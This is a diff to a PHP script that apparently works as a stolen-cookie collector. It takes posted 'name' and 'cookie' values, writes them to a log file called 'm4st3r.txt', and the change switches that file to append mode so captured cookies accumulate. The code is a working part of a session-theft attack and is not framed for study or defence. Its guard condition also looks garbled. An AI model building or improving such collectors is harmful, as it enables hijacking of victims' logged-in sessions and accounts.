@@ -16,7 +16,7 @@
 <?php
 $name = $_POST['name'];
 $cookie = $_POST['cookie'];
-$fifo = fopen('m4st3r.txt', 'w');
+$fifo = fopen('m4st3r.txt', 'a');
 if (is_null($name) && is_null($cookie) == FALSE) {
     fwrite($fifo, "----- [".$name."] -----\n");
     fwrite($fifo, $cookie);
